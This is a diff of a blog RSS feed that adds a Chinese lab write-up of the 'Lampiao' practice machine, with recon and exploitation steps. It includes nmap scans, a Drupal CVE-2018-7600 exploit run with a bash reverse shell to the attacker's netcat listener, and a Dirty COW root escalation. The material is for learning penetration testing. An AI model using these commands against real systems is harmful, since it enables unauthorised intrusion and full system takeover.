@@ -874,7 +874,83 @@ Use &#34;--help [option]&#34; to view documentation for a given option
 <pre tabindex="0"><code>sudo nmap -r -p- --min-rate 10000 10.10.10.45
 </code></pre><h3 id="慢速扫描">慢速扫描</h3>
 <pre tabindex="0"><code>sudo nmap -T2 -p- 10.10.10.45
-</code></pre>]]></content></item><item><title>DeathStart Writeup</title><link>https://enilmalus.github.io/posts/deathstart-writeup/</link><pubDate>Tue, 24 Jun 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/deathstart-writeup/</guid><description>&lt;blockquote&gt;
+</code></pre>]]></content></item><item><title>Lampiao Writeup</title><link>https://enilmalus.github.io/posts/lampiao-writeup/</link><pubDate>Sun, 13 Jul 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/lampiao-writeup/</guid><description>&lt;h1 id="lampiao-靶机"&gt;Lampiao 靶机&lt;/h1&gt;
+&lt;p&gt;环境：kali-linux-2025.1&lt;/p&gt;
+&lt;p&gt;网络：nat&lt;/p&gt;
+&lt;p&gt;攻击机ip：10.10.10.5&lt;/p&gt;
+&lt;p&gt;靶机ip：10.10.10.44&lt;/p&gt;
+&lt;h2 id="信息收集"&gt;信息收集&lt;/h2&gt;
+&lt;p&gt;使用 nmap 进行主机发现&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P1.png" alt="P1"&gt;&lt;/p&gt;
+&lt;p&gt;10.10.10.44 是新发现的主机，为靶机 IP；使用 nmap 以最低 10000 的速率进行全端口扫描&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --min-rate 10000 -p- 10.10.10.44
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
+&lt;p&gt;一共开放了三个 tcp 端口，使用 nmap 进行详细的端口扫描&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sT -sC -sV -p22,80,1839 10.10.10.44
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P6.png" alt="P6"&gt;&lt;/p&gt;
+&lt;p&gt;可以看到靶机开放 22 端口的 ssh 服务，一般 ssh 服务的渗透优先级靠后；80 端口是一个 http 服务，扫描出来的字符看上去并没有更多信息；1898 端口是一个 Apache 的 http 服务；使用 nmap 进行默认脚本扫描&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --script=vuln -p22,80,1898 10.10.10.44
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P7.png" alt="P7"&gt;&lt;/p&gt;
+&lt;p&gt;没有扫描出来可以利用的漏洞信息&lt;/p&gt;
+&lt;h2 id="web-渗透"&gt;Web 渗透&lt;/h2&gt;
+&lt;p&gt;访问 80 端口，是一个字符串组成的图案，查看源码并没有发现更多信息&lt;/p&gt;
+&lt;p&gt;&lt;img src="P8.png" alt="P8"&gt;&lt;/p&gt;
+&lt;p&gt;访问 1898 端口发现有一个登入界面，尝试常见弱口令没有进去&lt;/p&gt;</description><content type="html"><![CDATA[<h1 id="lampiao-靶机">Lampiao 靶机</h1>
+<p>环境：kali-linux-2025.1</p>
+<p>网络：nat</p>
+<p>攻击机ip：10.10.10.5</p>
+<p>靶机ip：10.10.10.44</p>
+<h2 id="信息收集">信息收集</h2>
+<p>使用 nmap 进行主机发现</p>
+<pre tabindex="0"><code>sudo nmap -sn 10.10.10.0/24
+</code></pre><p><img src="P1.png" alt="P1"></p>
+<p>10.10.10.44 是新发现的主机，为靶机 IP；使用 nmap 以最低 10000 的速率进行全端口扫描</p>
+<pre tabindex="0"><code>sudo nmap --min-rate 10000 -p- 10.10.10.44
+</code></pre><p><img src="P2.png" alt="P2"></p>
+<p>一共开放了三个 tcp 端口，使用 nmap 进行详细的端口扫描</p>
+<pre tabindex="0"><code>sudo nmap -sT -sC -sV -p22,80,1839 10.10.10.44
+</code></pre><p><img src="P6.png" alt="P6"></p>
+<p>可以看到靶机开放 22 端口的 ssh 服务，一般 ssh 服务的渗透优先级靠后；80 端口是一个 http 服务，扫描出来的字符看上去并没有更多信息；1898 端口是一个 Apache 的 http 服务；使用 nmap 进行默认脚本扫描</p>
+<pre tabindex="0"><code>sudo nmap --script=vuln -p22,80,1898 10.10.10.44
+</code></pre><p><img src="P7.png" alt="P7"></p>
+<p>没有扫描出来可以利用的漏洞信息</p>
+<h2 id="web-渗透">Web 渗透</h2>
+<p>访问 80 端口，是一个字符串组成的图案，查看源码并没有发现更多信息</p>
+<p><img src="P8.png" alt="P8"></p>
+<p>访问 1898 端口发现有一个登入界面，尝试常见弱口令没有进去</p>
+<p><img src="P11.png" alt="P11"></p>
+<p>左下角写着这个开源系统的名称，查看源码，发现详细的版本</p>
+<p><img src="P10.png" alt="P10"></p>
+<p>github 上找到一个 CVE 利用，下载下来根据提示使用</p>
+<p><img src="P12.png" alt="P12"></p>
+<p><img src="P13.png" alt="P13"></p>
+<p>在 kali 本地建立一个监听，使用脚本连接到 kali</p>
+<pre tabindex="0"><code>sudo nc -lvnp 4444
+</code></pre><pre tabindex="0"><code>python3 drupa7-CVE-2018-7600.py http://10.10.10.44:1898/ -c &#39;bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34;&#39;
+</code></pre><p><img src="P14.png" alt="P14"></p>
+<h2 id="linux-提权">Linux 提权</h2>
+<p>在 tmp 目录下下载 linpeas 进行自动化枚举</p>
+<pre tabindex="0"><code>chmod +x linpeas.sh
+</code></pre><pre tabindex="0"><code>./linpeas.sh
+</code></pre><p><img src="P17.png" alt="P17"></p>
+<p>发现有 dirty cow 漏洞</p>
+<p><img src="P18.png" alt="P18"></p>
+<p>使用 searchsploit 搜索并下载 dirty cow 利用脚本</p>
+<pre tabindex="0"><code>searchsploit dirty cow
+</code></pre><pre tabindex="0"><code>searchsploit -m 40847
+</code></pre><p><img src="P20.png" alt="P20"></p>
+<p>传进 kali 并利用</p>
+<p><img src="P19.png" alt="P19"></p>
+<p><img src="P15.png" alt="P15"></p>
+<p>发现 root 密码被改为了 dirtyCowFun，使用 ssh 连接 root</p>
+<p><img src="P21.png" alt="P21"></p>
+<h2 id="遇到问题">遇到问题</h2>
+<ul>
+<li>在 github 上下载的 内核提权 利用会导致靶机崩溃</li>
+</ul>
+<p>解决：使用 searchsploit 库中的 dirty cow 利用</p>
+]]></content></item><item><title>DeathStart Writeup</title><link>https://enilmalus.github.io/posts/deathstart-writeup/</link><pubDate>Tue, 24 Jun 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/deathstart-writeup/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h1 id="nmap-扫描"&gt;Nmap 扫描&lt;/h1&gt;
